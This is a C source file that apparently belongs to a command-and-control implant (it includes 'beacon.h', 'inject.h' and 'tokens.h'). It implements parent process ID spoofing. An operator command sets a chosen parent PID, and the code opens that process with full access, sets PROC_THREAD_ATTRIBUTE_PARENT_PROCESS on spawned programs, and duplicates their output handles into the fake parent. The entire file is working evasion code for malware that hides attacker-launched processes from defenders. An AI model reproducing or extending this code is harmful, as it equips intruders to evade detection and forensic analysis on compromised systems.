#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"

#include "process.h"

/* spawn ppid */
DWORD ppid = 0;

BOOL is_same_desktop_session(DWORD pid) {
	DWORD mysessid;
	DWORD ppsessid;

	if (ProcessIdToSessionId(pid, &ppsessid) && ProcessIdToSessionId(GetCurrentProcessId(), &mysessid)) {
		if (mysessid != ppsessid)
			return FALSE;
	}

	return TRUE;
}

/* set the PPID value for our spawns */
void command_ppid(char * buffer, int length) {
	datap parser;

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* grab the PPID value */
	ppid = data_int(&parser);

	/* we're done */
	if (ppid == 0)
		return;

	/* warn the user if they opt to fuck up in this way */
	if (!is_same_desktop_session(ppid))
		post_error_d(0xf, ppid);
}

/* make it easier to know which value is the PPID value */
BOOL execute_program_with_default_ppid(char * cbuffer, int clen, STARTUPINFO * si, PROCESS_INFORMATION * pi, DWORD flags, BOOL ignoreToken) {
	return execute_program_with_ppid(cbuffer, clen, si, pi, flags, ignoreToken, ppid);
}

/* set the parent process attribute, please */
BOOL process_ppid_pre(void * thisp, int ppid, void * pattr, void * siptr) {
	HANDLE                      hParentProcess;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)pattr;
	EX_ATTR_MOD *               mods           = (EX_ATTR_MOD *)thisp;
	STARTUPINFO *               si             = (STARTUPINFO *)siptr;

	/* open our parent process */
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);
	if (hParentProcess == NULL) {
		post_error_dd(0x22, ppid, GetLastError());
		return FALSE;
	}

	/* argument needs to stay in scope until thread proc list is destroyed */
	mods->harg = hParentProcess;

	/* set the parent process attribute */
	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &(mods->harg), sizeof(HANDLE), NULL, NULL)) {
		post_error_d(0x47, GetLastError());
		CloseHandle(hParentProcess);
		return FALSE;
	}

	/* duplicate the handles, please (allows output to propagate) */
	if (si->hStdOutput != NULL && si->hStdError != NULL && si->hStdOutput == si->hStdError) {
		DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hParentProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
		si->hStdError = si->hStdOutput;
	}
	else {
		if (si->hStdOutput != NULL)
			DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hParentProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);

		if (si->hStdError != NULL)
			DuplicateHandle(GetCurrentProcess(), si->hStdError, hParentProcess, &si->hStdError, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
	}

	return TRUE;
}

/* close the handle to our parent process, pls */
void process_ppid_post(void * thisp) {
	EX_ATTR_MOD * mods = (EX_ATTR_MOD *)thisp;
	CloseHandle(mods->harg);
}

EX_ATTR_MOD process_ppid() {
	EX_ATTR_MOD result;
	result.pre  = process_ppid_pre;
	result.post = process_ppid_post;
	result.harg = INVALID_HANDLE_VALUE;
	return result;
}
